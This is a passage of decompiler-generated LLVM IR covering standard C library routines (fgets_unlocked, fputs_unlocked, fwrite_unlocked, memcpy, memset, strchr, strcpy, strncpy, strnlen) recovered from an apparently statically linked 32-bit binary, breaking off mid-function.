  uselistorder label %dec_label_pc_804f081, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f053, { 1, 0 }
  uselistorder label %dec_label_pc_804f026, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804f0dc = load i32, i32* @ebp, align 4
  %v4_804f0e3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f0e3, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804f0e3, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804f12d.preheader, label %dec_label_pc_804f139

dec_label_pc_804f12d.preheader:                   ; preds = %entry
  %v1_804f12d19 = add i32 %arg2, -1
  %v8_804f12d20 = icmp eq i32 %v1_804f12d19, 0
  store i32 %v1_804f12d19, i32* @esi, align 4
  %v1_804f12e21 = icmp eq i1 %v8_804f12d20, false
  br i1 %v1_804f12e21, label %dec_label_pc_804f0f7, label %dec_label_pc_804f130

dec_label_pc_804f0f7:                             ; preds = %dec_label_pc_804f12d.preheader, %dec_label_pc_804f12b.dec_label_pc_804f12d_crit_edge.dec_label_pc_804f0f7_crit_edge
  %v0_804f0f7 = phi i32 [ %v0_804f0f7.pre, %dec_label_pc_804f12b.dec_label_pc_804f12d_crit_edge.dec_label_pc_804f0f7_crit_edge ], [ %arg3, %dec_label_pc_804f12d.preheader ]
  %v1_804f0f7 = add i32 %v0_804f0f7, 16
  %v2_804f0f7 = inttoptr i32 %v1_804f0f7 to i32*
  %v3_804f0f7 = load i32, i32* %v2_804f0f7, align 4
  store i32 %v3_804f0f7, i32* %eax.global-to-local, align 4
  %v2_804f0fa = add i32 %v0_804f0f7, 24
  %v3_804f0fa = inttoptr i32 %v2_804f0fa to i32*
  %v4_804f0fa = load i32, i32* %v3_804f0fa, align 4
  %v10_804f0fa = icmp ult i32 %v3_804f0f7, %v4_804f0fa
  %v1_804f0fd = icmp eq i1 %v10_804f0fa, false
  br i1 %v1_804f0fd, label %dec_label_pc_804f10d, label %dec_label_pc_804f0ff

dec_label_pc_804f0ff:                             ; preds = %dec_label_pc_804f0f7
  %v1_804f0ff = inttoptr i32 %v3_804f0f7 to i8*
  %v2_804f0ff = load i8, i8* %v1_804f0ff, align 1
  %v3_804f0ff = zext i8 %v2_804f0ff to i32
  %v4_804f0ff = load i32, i32* @edx, align 4
  %v5_804f0ff = and i32 %v4_804f0ff, -256
  %v6_804f0ff = or i32 %v5_804f0ff, %v3_804f0ff
  store i32 %v6_804f0ff, i32* @edx, align 4
  %v1_804f101 = add i32 %v3_804f0f7, 1
  store i32 %v1_804f101, i32* %eax.global-to-local, align 4
  %v2_804f102 = load i32, i32* @ebx, align 4
  %v3_804f102 = inttoptr i32 %v2_804f102 to i8*
  store i8 %v2_804f0ff, i8* %v3_804f102, align 1
  %v0_804f104 = load i32, i32* @ebx, align 4
  %v1_804f104 = add i32 %v0_804f104, 1
  store i32 %v1_804f104, i32* @ebx, align 4
  %v0_804f105 = load i32, i32* @edx, align 4
  %v1_804f105 = trunc i32 %v0_804f105 to i8
  %v10_804f105 = icmp eq i8 %v1_804f105, 10
  %v0_804f108 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f108 = load i32, i32* @ebp, align 4
  %v2_804f108 = add i32 %v1_804f108, 16
  %v3_804f108 = inttoptr i32 %v2_804f108 to i32*
  store i32 %v0_804f108, i32* %v3_804f108, align 4
  br i1 %v10_804f105, label %dec_label_pc_804f130, label %dec_label_pc_804f12b.dec_label_pc_804f12d_crit_edge

dec_label_pc_804f10d:                             ; preds = %dec_label_pc_804f0f7
  %v0_804f111 = call i32 @getc_unlocked()
  %v1_804f111 = trunc i32 %v0_804f111 to i8
  store i32 %v0_804f111, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_804f111, 256
  %v11_804f119 = icmp eq i32 %sext.mask, 255
  %v1_804f11c = icmp eq i1 %v11_804f119, false
  br i1 %v1_804f11c, label %dec_label_pc_804f12b, label %dec_label_pc_804f11e

dec_label_pc_804f11e:                             ; preds = %dec_label_pc_804f10d
  %v0_804f11e = load i32, i32* @ebp, align 4
  %v1_804f11e = inttoptr i32 %v0_804f11e to i8*
  %v2_804f11e = load i8, i8* %v1_804f11e, align 1
  %v3_804f11e = and i8 %v2_804f11e, 8
  %v4_804f11e = icmp eq i8 %v3_804f11e, 0
  br i1 %v4_804f11e, label %dec_label_pc_804f130, label %dec_label_pc_804f139

dec_label_pc_804f12b:                             ; preds = %dec_label_pc_804f10d
  %v3_804f126 = load i32, i32* @ebx, align 4
  %v4_804f126 = inttoptr i32 %v3_804f126 to i8*
  store i8 %v1_804f111, i8* %v4_804f126, align 1
  %v0_804f128 = load i32, i32* @ebx, align 4
  %v1_804f128 = add i32 %v0_804f128, 1
  store i32 %v1_804f128, i32* @ebx, align 4
  %v11_804f129 = icmp eq i8 %v1_804f111, 10
  br i1 %v11_804f129, label %dec_label_pc_804f130, label %dec_label_pc_804f12b.dec_label_pc_804f12d_crit_edge

dec_label_pc_804f12b.dec_label_pc_804f12d_crit_edge: ; preds = %dec_label_pc_804f0ff, %dec_label_pc_804f12b
  %v0_804f12d.pre = load i32, i32* @esi, align 4
  %v1_804f12d = add i32 %v0_804f12d.pre, -1
  %v8_804f12d = icmp eq i32 %v1_804f12d, 0
  store i32 %v1_804f12d, i32* @esi, align 4
  %v1_804f12e = icmp eq i1 %v8_804f12d, false
  br i1 %v1_804f12e, label %dec_label_pc_804f12b.dec_label_pc_804f12d_crit_edge.dec_label_pc_804f0f7_crit_edge, label %dec_label_pc_804f130

dec_label_pc_804f12b.dec_label_pc_804f12d_crit_edge.dec_label_pc_804f0f7_crit_edge: ; preds = %dec_label_pc_804f12b.dec_label_pc_804f12d_crit_edge
  %v0_804f0f7.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f0f7

dec_label_pc_804f130:                             ; preds = %dec_label_pc_804f12d.preheader, %dec_label_pc_804f0ff, %dec_label_pc_804f12b.dec_label_pc_804f12d_crit_edge, %dec_label_pc_804f12b, %dec_label_pc_804f11e
  %v0_804f130 = load i32, i32* @ebx, align 4
  %v1_804f130 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_804f130, %v1_804f130
  br i1 %tmp23, label %dec_label_pc_804f134, label %dec_label_pc_804f139

dec_label_pc_804f134:                             ; preds = %dec_label_pc_804f130
  %v1_804f134 = inttoptr i32 %v0_804f130 to i8*
  store i8 0, i8* %v1_804f134, align 1
  %v0_804f13e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f13b

dec_label_pc_804f139:                             ; preds = %dec_label_pc_804f130, %dec_label_pc_804f11e, %entry
  br label %dec_label_pc_804f13b

dec_label_pc_804f13b:                             ; preds = %dec_label_pc_804f134, %dec_label_pc_804f139
  %v0_804f13e = phi i32 [ %v0_804f13e.pre, %dec_label_pc_804f134 ], [ 0, %dec_label_pc_804f139 ]
  store i32 %v0_804f13e, i32* %eax.global-to-local, align 4
  store i32 %v0_804f0dc, i32* @ebp, align 4
  ret i32 %v0_804f13e

; uselistorder directives
  uselistorder i32 %v0_804f13e, { 1, 0 }
  uselistorder i32 %v0_804f130, { 1, 0 }
  uselistorder i32 %v1_804f12d, { 1, 0 }
  uselistorder i32 %v0_804f111, { 0, 2, 1 }
  uselistorder i32 %v0_804f0f7, { 1, 0 }
  uselistorder label %dec_label_pc_804f13b, { 1, 0 }
  uselistorder label %dec_label_pc_804f130, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804f12b.dec_label_pc_804f12d_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804f0f7, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804f148 = load i32, i32* @esi, align 4
  %v0_804f149 = load i32, i32* @ebx, align 4
  store i32 %v0_804f149, i32* %stack_var_-8, align 4
  %v4_804f14d = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f14d, i32* @ebx, align 4
  %v3_804f152 = call i32 @strlen(i8* %arg1)
  store i32 %v3_804f152, i32* @esi, align 4
  %v0_804f163 = load i32, i32* @ebx, align 4
  %v6_804f164 = call i32 @__GI_fwrite_unlocked(i32 %v0_804f163, i64 1, i32 %v3_804f152, i32 %arg2)
  %v1_804f16f = load i32, i32* @esi, align 4
  %v12_804f16f = icmp eq i32 %v6_804f164, %v1_804f16f
  %v1_804f171 = icmp eq i1 %v12_804f16f, false
  br i1 %v1_804f171, label %dec_label_pc_804f175, label %dec_label_pc_804f173

dec_label_pc_804f173:                             ; preds = %entry
  br label %dec_label_pc_804f175

dec_label_pc_804f175:                             ; preds = %entry, %dec_label_pc_804f173
  %v0_804f175 = phi i32 [ -1, %entry ], [ %v6_804f164, %dec_label_pc_804f173 ]
  %v2_804f178 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f178, i32* @ebx, align 4
  store i32 %v0_804f148, i32* @esi, align 4
  ret i32 %v0_804f175

; uselistorder directives
  uselistorder i32 %v6_804f164, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f175, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804f17c = load i32, i32* @edi, align 4
  %v0_804f17d = load i32, i32* @esi, align 4
  %v0_804f17e = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804f183 = trunc i64 %arg2 to i32
  store i32 %v4_804f183, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804f18b = inttoptr i32 %arg4 to i16*
  %v2_804f18b = load i16, i16* %v1_804f18b, align 2
  %v1_804f18e = and i16 %v2_804f18b, 192
  %v6_804f193 = icmp eq i16 %v1_804f18e, 192
  br i1 %v6_804f193, label %dec_label_pc_804f1ae, label %dec_label_pc_804f19a

dec_label_pc_804f19a:                             ; preds = %entry
  %v0_804f19a = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_804f1a2 = call i32 @__stdio_trans2w_o(i16* %v1_804f18b, i32 128, i32 %v0_804f19a, i32 %v0_804f19a, i32 %v0_804f17e, i32 %v0_804f17d, i32 %v0_804f17c)
  %v1_804f1aa = icmp eq i32 %v9_804f1a2, 0
  %v1_804f1ac = icmp eq i1 %v1_804f1aa, false
  br i1 %v1_804f1ac, label %dec_label_pc_804f1ea, label %dec_label_pc_804f1ae

dec_label_pc_804f1ae:                             ; preds = %dec_label_pc_804f19a, %entry
  %v2_804f1ae = icmp eq i32 %v4_804f183, 0
  br i1 %v2_804f1ae, label %dec_label_pc_804f1ea, label %dec_label_pc_804f1b2

dec_label_pc_804f1b2:                             ; preds = %dec_label_pc_804f1ae
  %v1_804f1b2 = icmp eq i32 %arg3, 0
  br i1 %v1_804f1b2, label %dec_label_pc_804f1ea, label %dec_label_pc_804f1b6

dec_label_pc_804f1b6:                             ; preds = %dec_label_pc_804f1b2
  %v9_804f1bb = udiv i64 4294967295, %arg2
  %v10_804f1bb = trunc i64 %v9_804f1bb to i32
  %v6_804f1bf = icmp ult i32 %v10_804f1bb, %arg3
  br i1 %v6_804f1bf, label %dec_label_pc_804f1db, label %dec_label_pc_804f1c1

dec_label_pc_804f1c1:                             ; preds = %dec_label_pc_804f1b6
  %sext = mul i64 %arg2, 4294967296
  %v2_804f1c4 = sdiv i64 %sext, 4294967296
  %v3_804f1c4 = sext i32 %arg3 to i64
  %v4_804f1c4 = mul nsw i64 %v3_804f1c4, %v2_804f1c4
  %v5_804f1c4 = trunc i64 %v4_804f1c4 to i32
  %v0_804f1c7 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804f1cd = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804f1c4, i32 %v0_804f1c7, i32 %v10_804f1bb)
  %v6_804f1cd = sext i32 %v5_804f1cd to i64
  %v10_804f1d4 = udiv i64 %v6_804f1cd, %arg2
  %v11_804f1d4 = trunc i64 %v10_804f1d4 to i32
  br label %dec_label_pc_804f1ec

dec_label_pc_804f1db:                             ; preds = %dec_label_pc_804f1b6
  %v0_804f1db = load i32, i32* @ebx, align 4
  %v1_804f1db = inttoptr i32 %v0_804f1db to i16*
  %v2_804f1db = load i16, i16* %v1_804f1db, align 2
  %v3_804f1db = or i16 %v2_804f1db, 8
  store i16 %v3_804f1db, i16* %v1_804f1db, align 2
  %v0_804f1df = load i32, i32* %stack_var_-28, align 4
  %v1_804f1df = call i32 @__errno_location(i32 %v0_804f1df)
  %v1_804f1e4 = inttoptr i32 %v1_804f1df to i32*
  store i32 22, i32* %v1_804f1e4, align 4
  br label %dec_label_pc_804f1ea

dec_label_pc_804f1ea:                             ; preds = %dec_label_pc_804f1b2, %dec_label_pc_804f1ae, %dec_label_pc_804f19a, %dec_label_pc_804f1db
  br label %dec_label_pc_804f1ec

dec_label_pc_804f1ec:                             ; preds = %dec_label_pc_804f1c1, %dec_label_pc_804f1ea
  %v0_804f1ef = phi i32 [ %v11_804f1d4, %dec_label_pc_804f1c1 ], [ 0, %dec_label_pc_804f1ea ]
  store i32 %v0_804f17d, i32* @esi, align 4
  store i32 %v0_804f17c, i32* @edi, align 4
  ret i32 %v0_804f1ef

; uselistorder directives
  uselistorder i32 %v0_804f19a, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f1ec, { 1, 0 }
  uselistorder label %dec_label_pc_804f1ea, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f1f1 = load i32, i32* @esi, align 4
  store i32 %v0_804f1f1, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804f1f2 = sdiv i32 %sext, 16777216
  store i32 %v4_804f1f2, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f1fc = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f1fc, i32* %edi.global-to-local, align 4
  %v2_804f200 = udiv i32 %v4_804f1f2, 4
  %v3_804f203 = inttoptr i32 %arg2 to i8*
  %v4_804f203 = bitcast i16* %arg1 to i8*
  %v5_804f203 = call i8* @_memcpy(i8* %v4_804f203, i8* %v3_804f203, i32 %v2_804f200)
  %v6_804f203 = ptrtoint i8* %v5_804f203 to i32
  store i32 %v6_804f203, i32* @ecx, align 4
  %v0_804f205 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f205 = and i32 %v0_804f205, 2
  %v3_804f205 = icmp eq i32 %v2_804f205, 0
  br i1 %v3_804f205, label %dec_label_pc_804f20b, label %dec_label_pc_804f209

dec_label_pc_804f209:                             ; preds = %entry
  %v0_804f209 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f209 = inttoptr i32 %v0_804f209 to i16*
  %v2_804f209 = load i16, i16* %v1_804f209, align 2
  %v3_804f209 = load i32, i32* %edi.global-to-local, align 4
  %v4_804f209 = inttoptr i32 %v3_804f209 to i16*
  store i16 %v2_804f209, i16* %v4_804f209, align 2
  %v5_804f209 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f209 = load i32, i32* %esi.global-to-local, align 4
  %v7_804f209 = load i1, i1* @df, align 1
  %v8_804f209 = select i1 %v7_804f209, i32 -2, i32 2
  %v9_804f209 = add i32 %v8_804f209, %v5_804f209
  %v10_804f209 = add i32 %v8_804f209, %v6_804f209
  store i32 %v9_804f209, i32* %edi.global-to-local, align 4
  store i32 %v10_804f209, i32* %esi.global-to-local, align 4
  %v0_804f20b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f20b

dec_label_pc_804f20b:                             ; preds = %entry, %dec_label_pc_804f209
  %v0_804f20b = phi i32 [ %v0_804f205, %entry ], [ %v0_804f20b.pre, %dec_label_pc_804f209 ]
  %v2_804f20b = urem i32 %v0_804f20b, 2
  %v3_804f20b = icmp eq i32 %v2_804f20b, 0
  br i1 %v3_804f20b, label %dec_label_pc_804f210, label %dec_label_pc_804f20f

dec_label_pc_804f20f:                             ; preds = %dec_label_pc_804f20b
  %v0_804f20f = load i32, i32* %esi.global-to-local, align 4
  %v1_804f20f = inttoptr i32 %v0_804f20f to i8*
  %v2_804f20f = load i8, i8* %v1_804f20f, align 1
  %v3_804f20f = load i32, i32* %edi.global-to-local, align 4
  %v4_804f20f = inttoptr i32 %v3_804f20f to i8*
  store i8 %v2_804f20f, i8* %v4_804f20f, align 1
  %v5_804f20f = load i32, i32* %edi.global-to-local, align 4
  %v6_804f20f = load i32, i32* %esi.global-to-local, align 4
  %v7_804f20f = load i1, i1* @df, align 1
  %v8_804f20f = select i1 %v7_804f20f, i32 -1, i32 1
  %v9_804f20f = add i32 %v8_804f20f, %v5_804f20f
  %v10_804f20f = add i32 %v8_804f20f, %v6_804f20f
  store i32 %v9_804f20f, i32* %edi.global-to-local, align 4
  store i32 %v10_804f20f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f210

dec_label_pc_804f210:                             ; preds = %dec_label_pc_804f20b, %dec_label_pc_804f20f
  store i32 %v4_804f1fc, i32* %eax.global-to-local, align 4
  %v2_804f214 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f214, i32* @esi, align 4
  ret i32 %v4_804f1fc

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804f210, { 1, 0 }
  uselistorder label %dec_label_pc_804f20b, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804f218 = load i32, i32* @edi, align 4
  %v4_804f221 = ptrtoint i8* %arg1 to i32
  %v5_804f225 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804f225 = ptrtoint i8* %v5_804f225 to i32
  store i32 %v6_804f225, i32* @ecx, align 4
  store i32 %v0_804f218, i32* @edi, align 4
  ret i32 %v4_804f221

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804f231 = ptrtoint i8* %arg1 to i32
  %v2_804f239 = mul i32 %arg2, 256
  %v3_804f239 = and i32 %v2_804f239, 65280
  %v4_804f239 = and i32 %arg2, -65281
  %v5_804f239 = or i32 %v3_804f239, %v4_804f239
  %v8_804f23b.pre = load i1, i1* @df, align 1
  %v9_804f23b = select i1 %v8_804f23b.pre, i32 -1, i32 1
  br label %dec_label_pc_804f23b

dec_label_pc_804f23b:                             ; preds = %dec_label_pc_804f240, %entry
  %v4_804f23b = phi i32 [ %v6_804f23b, %dec_label_pc_804f240 ], [ %v5_804f239, %entry ]
  %v7_804f23b = phi i32 [ %v10_804f23b, %dec_label_pc_804f240 ], [ %v4_804f231, %entry ]
  %v1_804f23b = inttoptr i32 %v7_804f23b to i8*
  %v2_804f23b = load i8, i8* %v1_804f23b, align 1
  %v10_804f23b = add i32 %v7_804f23b, %v9_804f23b
  %v3_804f23c = udiv i32 %v4_804f23b, 256
  %v4_804f23c = trunc i32 %v3_804f23c to i8
  %v16_804f23c = icmp eq i8 %v2_804f23b, %v4_804f23c
  br i1 %v16_804f23c, label %dec_label_pc_804f249.loopexit, label %dec_label_pc_804f240

dec_label_pc_804f240:                             ; preds = %dec_label_pc_804f23b
  %v3_804f23b = zext i8 %v2_804f23b to i32
  %v5_804f23b = and i32 %v4_804f23b, -256
  %v6_804f23b = or i32 %v3_804f23b, %v5_804f23b
  %v4_804f240 = icmp eq i8 %v2_804f23b, 0
  %v1_804f242 = icmp eq i1 %v4_804f240, false
  br i1 %v1_804f242, label %dec_label_pc_804f23b, label %dec_label_pc_804f244

dec_label_pc_804f244:                             ; preds = %dec_label_pc_804f240
  br label %dec_label_pc_804f249

dec_label_pc_804f249.loopexit:                    ; preds = %dec_label_pc_804f23b
  %phitmp = add i32 %v10_804f23b, -1
  br label %dec_label_pc_804f249

dec_label_pc_804f249:                             ; preds = %dec_label_pc_804f249.loopexit, %dec_label_pc_804f244
  %v0_804f249 = phi i32 [ 0, %dec_label_pc_804f244 ], [ %phitmp, %dec_label_pc_804f249.loopexit ]
  ret i32 %v0_804f249

; uselistorder directives
  uselistorder i8 %v2_804f23b, { 1, 2, 0 }
  uselistorder i32 %v4_804f23b, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f251 = load i32, i32* @esi, align 4
  store i32 %v0_804f251, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f259 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f259, i32* %edi.global-to-local, align 4
  %v4_804f25d.pre = load i32, i32* @eax, align 4
  %v8_804f25d.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804f25d

dec_label_pc_804f25d:                             ; preds = %dec_label_pc_804f25d.dec_label_pc_804f25d_crit_edge, %entry
  %v2_804f25e = phi i32 [ %v7_804f25e, %dec_label_pc_804f25d.dec_label_pc_804f25d_crit_edge ], [ %v4_804f259, %entry ]
  %v8_804f25d = phi i1 [ %v5_804f25e, %dec_label_pc_804f25d.dec_label_pc_804f25d_crit_edge ], [ %v8_804f25d.pre, %entry ]
  %v4_804f25d = phi i32 [ %v0_804f25f, %dec_label_pc_804f25d.dec_label_pc_804f25d_crit_edge ], [ %v4_804f25d.pre, %entry ]
  %v7_804f25d = phi i32 [ %v0_804f25d.pre, %dec_label_pc_804f25d.dec_label_pc_804f25d_crit_edge ], [ %arg2, %entry ]
  %v1_804f25d = inttoptr i32 %v7_804f25d to i8*
  %v2_804f25d = load i8, i8* %v1_804f25d, align 1
  %v3_804f25d = zext i8 %v2_804f25d to i32
  %v5_804f25d = and i32 %v4_804f25d, -256
  %v6_804f25d = or i32 %v3_804f25d, %v5_804f25d
  store i32 %v6_804f25d, i32* %eax.global-to-local, align 4
  %v9_804f25d = select i1 %v8_804f25d, i32 -1, i32 1
  %v10_804f25d = add i32 %v7_804f25d, %v9_804f25d
  store i32 %v10_804f25d, i32* %esi.global-to-local, align 4
  %v3_804f25e = inttoptr i32 %v2_804f25e to i8*
  store i8 %v2_804f25d, i8* %v3_804f25e, align 1
  %v4_804f25e = load i32, i32* %edi.global-to-local, align 4
  %v5_804f25e = load i1, i1* @df, align 1
  %v6_804f25e = select i1 %v5_804f25e, i32 -1, i32 1
  %v7_804f25e = add i32 %v6_804f25e, %v4_804f25e
  store i32 %v7_804f25e, i32* %edi.global-to-local, align 4
  %v0_804f25f = load i32, i32* %eax.global-to-local, align 4
  %v3_804f25f = trunc i32 %v0_804f25f to i8
  %v4_804f25f = icmp eq i8 %v3_804f25f, 0
  %v1_804f261 = icmp eq i1 %v4_804f25f, false
  br i1 %v1_804f261, label %dec_label_pc_804f25d.dec_label_pc_804f25d_crit_edge, label %dec_label_pc_804f263

dec_label_pc_804f25d.dec_label_pc_804f25d_crit_edge: ; preds = %dec_label_pc_804f25d
  %v0_804f25d.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f25d

dec_label_pc_804f263:                             ; preds = %dec_label_pc_804f25d
  store i32 %v4_804f259, i32* %eax.global-to-local, align 4
  %v2_804f267 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f267, i32* @edx, align 4
  %v2_804f268 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f268, i32* @esi, align 4
  ret i32 %v4_804f259

; uselistorder directives
  uselistorder i32 %v0_804f25f, { 1, 0 }
  uselistorder i32 %v7_804f25e, { 1, 0 }
  uselistorder i1 %v5_804f25e, { 1, 0 }
  uselistorder i32 %v4_804f259, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f281 = load i32, i32* @esi, align 4
  store i32 %v0_804f281, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f28d = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f28d, i32* %edi.global-to-local, align 4
  %v1_804f291 = add i32 %arg3, 1
  store i32 %v1_804f291, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f292

dec_label_pc_804f292:                             ; preds = %dec_label_pc_804f295, %entry
  %v3_804f296 = phi i32 [ %v4_804f28d, %entry ], [ %v8_804f296, %dec_label_pc_804f295 ]
  %v0_804f292 = phi i32 [ %v1_804f291, %entry ], [ %v0_804f292.pre, %dec_label_pc_804f295 ]
  %v1_804f292 = add i32 %v0_804f292, -1
  %v8_804f292 = icmp eq i32 %v1_804f292, 0
  store i32 %v1_804f292, i32* %ecx.global-to-local, align 4
  br i1 %v8_804f292, label %.loopexit, label %dec_label_pc_804f295

dec_label_pc_804f295:                             ; preds = %dec_label_pc_804f292
  %v0_804f295 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f295 = inttoptr i32 %v0_804f295 to i8*
  %v2_804f295 = load i8, i8* %v1_804f295, align 1
  %v10_804f295 = load i1, i1* @df, align 1
  %v11_804f295 = select i1 %v10_804f295, i32 -1, i32 1
  %v12_804f295 = add i32 %v11_804f295, %v0_804f295
  store i32 %v12_804f295, i32* %esi.global-to-local, align 4
  %v4_804f296 = inttoptr i32 %v3_804f296 to i8*
  store i8 %v2_804f295, i8* %v4_804f296, align 1
  %v5_804f296 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f296 = load i1, i1* @df, align 1
  %v7_804f296 = select i1 %v6_804f296, i32 -1, i32 1
  %v8_804f296 = add i32 %v7_804f296, %v5_804f296
  store i32 %v8_804f296, i32* %edi.global-to-local, align 4
  %v6_804f297 = icmp eq i8 %v2_804f295, 0
  %v1_804f299 = icmp eq i1 %v6_804f297, false
  %v0_804f292.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f299, label %dec_label_pc_804f292, label %dec_label_pc_804f29b

dec_label_pc_804f29b:                             ; preds = %dec_label_pc_804f295
  %v1_804f29b = add i32 %v0_804f292.pre, -1
  store i32 %v1_804f29b, i32* %ecx.global-to-local, align 4
  %v2_804f29c = sext i8 %v2_804f295 to i32
  %v4_804f29c = inttoptr i32 %v8_804f296 to i8*
  %v5_804f29c = call i8* @_memset(i8* %v4_804f29c, i32 %v2_804f29c, i32 %v1_804f29b)
  %v6_804f29c = ptrtoint i8* %v5_804f29c to i32
  store i32 %v6_804f29c, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804f292, %dec_label_pc_804f29b
  %v2_804f2a2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f2a2, i32* @edx, align 4
  %v2_804f2a3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f2a3, i32* @esi, align 4
  ret i32 %v4_804f28d

; uselistorder directives
  uselistorder i32 %v8_804f296, { 0, 2, 1 }
  uselistorder i8 %v2_804f295, { 0, 2, 1 }
  uselistorder i32 %v1_804f292, { 1, 0 }
  uselistorder i32 %v4_804f28d, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_804f2a8 = ptrtoint i8* %tmp4 to i32
  %v8_804f2bb5 = icmp eq i32 %tmp, 0
  %v1_804f2bc6 = icmp eq i1 %v8_804f2bb5, false
  br i1 %v1_804f2bc6, label %dec_label_pc_804f2b5, label %dec_label_pc_804f2be

dec_label_pc_804f2b5:                             ; preds = %entry, %dec_label_pc_804f2ba
  %v1_804f2bb8 = phi i32 [ %v1_804f2bb, %dec_label_pc_804f2ba ], [ %tmp, %entry ]
  %v0_804f2be7 = phi i32 [ %v1_804f2ba, %dec_label_pc_804f2ba ], [ %v4_804f2a8, %entry ]
  %v1_804f2b5 = inttoptr i32 %v0_804f2be7 to i8*
  %v2_804f2b5 = load i8, i8* %v1_804f2b5, align 1
  %v3_804f2b5 = icmp eq i8 %v2_804f2b5, 0
  br i1 %v3_804f2b5, label %dec_label_pc_804f2be, label %dec_label_pc_804f2ba

dec_label_pc_804f2ba:                             ; preds = %dec_label_pc_804f2b5
